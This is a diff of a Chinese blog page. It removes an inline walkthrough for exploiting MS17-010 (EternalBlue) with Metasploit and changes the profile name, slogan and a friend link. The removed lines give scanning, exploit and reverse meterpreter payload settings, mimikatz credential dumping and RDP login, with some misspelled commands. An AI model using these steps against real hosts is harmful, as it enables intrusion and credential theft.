@@ -113,37 +113,11 @@
 <hr>
 <h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><h5 id="一、打开msfconsole工具并进行相应配置"><a href="#一、打开msfconsole工具并进行相应配置" class="headerlink" title="一、打开msfconsole工具并进行相应配置"></a>一、打开msfconsole工具并进行相应配置</h5><p>注意：所有的字符在英文状态下进行输入</p>
 <p>1、输入命令：search ms17_010         //搜索漏洞的利用模块</p>
-<!--mpre-->
-
-<p>2、输入命令：use auxiliary/scanner/smb/smb_ms17_010</p>
-<p><img src="https://s3.ax2x.com/2019/08/19/2.png" alt></p>
-<p>3、输入命令：set RHOSTS ip(被扫描的IP)</p>
-<p>4、输入命令：run                                //进行扫描，查看是否有漏洞</p>
-<p><img src="https://s3.ax2x.com/2019/08/19/3.png" alt></p>
-<h5 id="二、进行漏洞攻击"><a href="#二、进行漏洞攻击" class="headerlink" title="二、进行漏洞攻击"></a>二、进行漏洞攻击</h5><p>输入以下命令：（逐一进行执行）</p>
-<p>1、use exploit/windows/smb/ms17_010_eternablue      //加载攻击的模式</p>
-<p>2、set RHOST IP （被攻击主机IP）                                      //设置被攻击主机IP</p>
-<p>3、set LHOST IP （本地IP）                                                  //设置本地IP</p>
-<p>4、set LPORT 端口号                                                              //设置连接的端口</p>
-<p><img src="https://s3.ax2x.com/2019/08/19/4.png" alt></p>
-<p>5、set payload Windows/x64/meterpreter/reverse_top  //设置回链方式</p>
-<p>6、explorer                                                                              //开始攻击</p>
-<p><img src="https://s3.ax2x.com/2019/08/19/5.png" alt></p>
-<h5 id="三、执行系统命令"><a href="#三、执行系统命令" class="headerlink" title="三、执行系统命令"></a>三、执行系统命令</h5><p>1、sysinfo                                       //爆出系统信息</p>
-<p>2、screenshot                              //截屏，截屏后保存至/root/</p>
-<h5 id="四、获取hash破解登录密码"><a href="#四、获取hash破解登录密码" class="headerlink" title="四、获取hash破解登录密码"></a>四、获取hash破解登录密码</h5><p>接着输入以下命令</p>
-<p>1、load mimikatz</p>
-<p>2、help</p>
-<p><img src="https://s3.ax2x.com/2019/08/19/7.png" alt></p>
-<p>3、msv                                             //获取hash值</p>
-<p>4、ssp                                            //获取的是明文信息</p>
-<p><img src="https://s3.ax2x.com/2019/08/19/8.png" alt></p>
-<p>5、wdigest                                     //读取内存中存放的账号密码明文信息</p>
-<p>6、kerberos</p>
-<p><img src="https://s3.ax2x.com/2019/08/19/9.png" alt></p>
-<p>五、远程登录</p>
-<p>rdesktop  ip</p>
-
+        
+          <p class="article-more-link">
+            <a href="/2019/08/19/ms-010漏洞利用/#more">阅读全文</a>
+          </p>
+        
       
     </div>
     
@@ -195,11 +169,11 @@
     <img class="avatar" src="/images/default-avatar.webp" title="图片来自网络"></img>
     <h3 class="avatar-name">
       
-        一路烟霞
+        妆薄铅华浅
       
     </h3>
     <p class="avatar-slogan">
-      特别耐撕的小前端，资深的打酱油攻城狮。
+      风华是一指流沙，苍老是一段年华。
     </p>
   </div>
 </div>
@@ -249,9 +223,6 @@
       <div class="widget-box">
     <h3 class="widget-title">友链</h3>
     <div class="widget">
-      
-        <a style="display: block;" href="https://yiluyanxia.github.io/" title target='_blank'
-        >一路眼瞎</a>
       
     </div>
   </div>
